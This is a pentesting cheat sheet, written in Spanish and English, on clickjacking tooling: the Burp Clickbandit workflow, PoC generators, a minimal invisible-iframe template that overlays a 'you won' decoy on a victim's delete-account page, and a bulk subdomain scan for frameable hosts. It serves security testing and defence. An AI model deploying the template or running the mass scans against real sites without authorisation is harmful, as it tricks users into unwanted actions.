---
aliases:
  - Clickjacking Tooling
  - Clickbandit
  - Clickjacker
  - UI Redress Tooling
tags:
  - type/cheatsheet
  - vuln/clickjacking
  - technique/discovery
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - "[[Clickjacking]]"
  - "[[Burp Suite]]"
  - "[[nuclei]]"
---
# Clickjacking - Tooling

***

## Burp Clickbandit

| **Función** | **Comando** | **Notas** |
|:---:|:---:|:---:|
| Disponibilidad | Burp Pro built-in (Burp menu → Burp Clickbandit) | No en Community. |
| Activar | Burp menu → Burp Clickbandit → "Copy Clickbandit to clipboard" | JS payload generated. |
| Inyectar en target | Browser DevTools console → paste + enter en target page | Live recording. |
| Grabar clicks | Click "Start" en panel Clickbandit → interact con target → "Finish" | Captura clicks reales. |
| Generar PoC | "Save" → HTML autocontenido con iframe + decoy | Listo para servir. |
| Ajustar overlay | Modal slide → mostrar real iframe vs decoy alternativo | Visualización. |
| Test PoC | Open HTML local → verifica framing + click works | Validation. |
| Output | Single HTML file con iframe + CSS overlay | Standalone PoC. |
| Limitaciones | Requiere acceso a target (logged in si protected) | Auth needed sometimes. |
| Combine con Repeater | Mod parámetros antes de re-record | Iterative. |
| Combine con Match&Replace | Strip XFO/CSP en response → test framing local | Defeat-test. |
| Ver framing logs | Proxy → HTTP history filter `frame-ancestors` o XFO | Detection assist. |
^cj-tool-burp

### Workflow Clickbandit típico

```
1. Burp Pro → Burp Clickbandit → "Copy Clickbandit to clipboard"
2. Browser → navigate target → DevTools console (F12)
3. Paste payload → enter
4. UI Clickbandit aparece overlay → click "Start"
5. Interactuar con sensitive action (click submit, drag, etc.)
6. Click "Finish" → "Save" → HTML PoC descargado
7. Servir HTML desde server atacante (o file://) → repro chain
```

___

## PoC Generators y Templates

| **Tool** | **Tipo** | **Notas** |
|:---:|:---:|:---:|
| Burp Clickbandit | Auto-grabador | Realistic clicks-based. |
| [PortSwigger Lab Generator](https://portswigger.net/web-security/clickjacking) | Templates educativos | Aprender variantes. |
| Manual `<iframe + opacity>` | HTML básico | Full control. |
| Manual `<iframe sandbox>` | Bypass JS frame-busting | Sandbox attribute trick. |
| OWASP HTML5 PoC repos | GitHub variantes | Drag&drop, cursor jacking. |
| `clickjacker.io` | Online (verificar disponibilidad) | Quick PoC. |
| ZAP HUD overlay scanner | OWASP ZAP equivalent | Open-source alternative. |
| ClickjackerGen (CLI) | Generate HTML from URL | Bulk PoC. |
| Burp Repeater + manual HTML | Custom flexibilidad | Cualquier escenario. |
| Drag & drop template | Use `ondragstart` exfiltrar | Variant. |
| Cursor jacking template | CSS `cursor:none` + fake cursor | Variant. |
| Multi-step template | Decoy switches state mid-click | Complex. |
^cj-tool-generators

### Template manual mínimo

```html
<!DOCTYPE html>
<html>
<head>
<style>
  iframe {
    position:absolute; top:0; left:0;
    width:100%; height:100%;
    opacity:0.0001; z-index:2;
  }
  .decoy {
    position:absolute; top:300px; left:200px;
    z-index:1; padding:20px;
    background:#ff4444; color:#fff;
    font-size:24px; cursor:pointer;
  }
</style>
</head>
<body>
  <div class="decoy">¡GANASTE! Click para reclamar premio</div>
  <iframe src="https://victim.com/admin/delete-account"></iframe>
</body>
</html>
```

___

## Scanners y Bulk Recon

| **Tool** | **Comando** | **Notas** |
|:---:|:---:|:---:|
| nuclei templates clickjacking | `nuclei -u https://target -t http/misconfiguration/clickjacking/` | Bulk header scan. |
| nuclei missing-security-headers | `nuclei -u target -t http/misconfiguration/missing-sri.yaml` etc | Adjacent. |
| `clickjacker` (Go CLI) | `clickjacker -u https://target -v` | XFO/CSP focused. |
| WhatWeb plugin | `whatweb -v https://target` | Fingerprint + headers. |
| curl manual | `curl -sI URL \| grep -iE 'frame-options\|frame-ancestors'` | Quick check. |
| Wappalyzer browser ext | UI tab "Security" muestra headers | Visual. |
| OWASP ZAP passive scan | Active scanner alerts en framing | Open-source. |
| Burp passive scan (Pro) | Auto-flag missing XFO/CSP | Pro feature. |
| `httpx -title -web-server` | Bulk subdomain headers | `subfinder \| httpx`. |
| Custom Burp BCheck | `bchecks` script para framing | Pro v2023+. |
| `xfo-checker` script | curl loop bulk | Custom shell. |
| Headers Mozilla Observatory | `https://observatory.mozilla.org/?host=target` | Online grader. |
^cj-tool-scanners

### Bulk recon pipeline

```bash
# Subdomain enum + headers + filter frameable
subfinder -d target.com -silent | \
  httpx -silent -mc 200 -title -web-server -tech-detect -path / | \
  while read line; do
    URL=$(echo "$line" | awk '{print $1}')
    HEADERS=$(curl -sI "$URL" 2>/dev/null)
    if ! echo "$HEADERS" | grep -qiE 'x-frame-options|frame-ancestors'; then
      echo "[+] FRAMEABLE: $URL"
    fi
  done

# Bulk nuclei
echo "https://target.com" > urls.txt
nuclei -l urls.txt -t http/misconfiguration/clickjacking/ -severity medium,high
```

___

## Browser DevTools y Frame Testing

| **Función** | **Acción** | **Notas** |
|:---:|:---:|:---:|
| Test framing local | Console: `document.body.innerHTML+='<iframe src="URL">'` | Si carga → frameable. |
| Inspect XFO en Network | Network tab → Response Headers | Direct check. |
| CSP errors en Console | "Refused to frame" message | CSP blocking. |
| Touch emulation | DevTools → device toolbar mobile | Test touchjacking. |
| Disable JS test | Settings → Disable JavaScript → reload | Verify JS-only frame-busting. |
| Cookie inspection | Application → Cookies | SameSite values. |
| Storage view | Application → Local/Session Storage | Token check. |
| Permissions panel | Settings → permissions → camera/mic state | WebRTC chain. |
| Sources tab | Search en JS bundles `frame-buster` patterns | Code review. |
| Coverage tab | Detect dead JS frame-busting | Optimization. |
| Performance tab | Frame timing analysis | Touch jacking timing. |
| Lighthouse audit | Best Practices → "frame-ancestors" | Auto-check. |
^cj-tool-devtools

___

## Wordlists y Repos

| **Repo** | **Contenido** | **Notas** |
|:---:|:---:|:---:|
| [PayloadsAllTheThings - Clickjacking](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Clickjacking) | Templates, sandbox tricks | Foundation. |
| [SecLists](https://github.com/danielmiessler/SecLists) | `Fuzzing/clickjacking-payloads.txt` | URL params auto-fill forms. |
| [HackTricks - Clickjacking](https://book.hacktricks.xyz/pentesting-web/clickjacking) | Variantes + chains | Reference. |
| [OWASP Clickjacking Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html) | Mitigations | Defense. |
| HackerOne disclosed reports | Real-world PoCs | Bug bounty. |
| Bugcrowd VRT | Severity guide | Scoring. |
| OWASP Testing Guide | Clickjacking section | Methodology. |
| MITRE ATT&CK | Initial Access references | Threat modeling. |
| W3C UI Security | Working group docs | Spec evolution. |
| BlackHat / DEF CON talks | Niemietz UI redressing | Academic depth. |
| OWASP cheatsheet examples | Per-framework defense | Multi-stack. |
| `xframeoptions-bypass.txt` custom | Custom payload list | Per-engagement. |
^cj-tool-wordlists

***
